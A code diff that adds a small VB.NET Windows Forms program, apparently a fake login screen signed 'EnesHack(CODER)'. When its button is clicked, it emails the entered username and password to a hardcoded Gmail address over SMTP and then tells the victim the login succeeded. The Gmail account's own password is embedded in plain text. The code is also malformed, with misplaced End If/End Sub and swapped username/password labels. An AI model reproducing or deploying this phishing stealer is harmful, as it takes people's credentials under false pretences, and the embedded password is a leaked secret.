@@ -1,0 +1,25 @@
+Imports System.Net.Mail
+Public Class Form1
+    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
+ If TextBox1.Text = "" Then
+            MsgBox("Kullanýcý Adý Yanlýþ")
+            If TextBox2.Text = "" Then
+                MsgBox("Þifre Yanlýþ")
+            End If
+        Else
+            Dim smtpServer As New SmtpClient()
+            Dim mail As New MailMessage()
+            smtpServer.Credentials = New Net.NetworkCredential("enesipek200@gmail.com", "metin2000")
+            'using gmail
+            smtpServer.Port = 587
+            smtpServer.Host = "smtp.gmail.com"
+            smtpServer.EnableSsl = True
+            mail = New MailMessage()
+            mail.From = New MailAddress("enesipek200@gmail.com")
+            mail.To.Add("enesipek200@gmail.com")
+            mail.Subject = "Username : " & TextBox2.Text
+            mail.Body = "Password : " & TextBox1.Text & ","
+            smtpServer.Send(mail)
+            MsgBox("GÝRÝÞ YAPILDI (EnesHack(CODER)")
+    End Sub
+End If
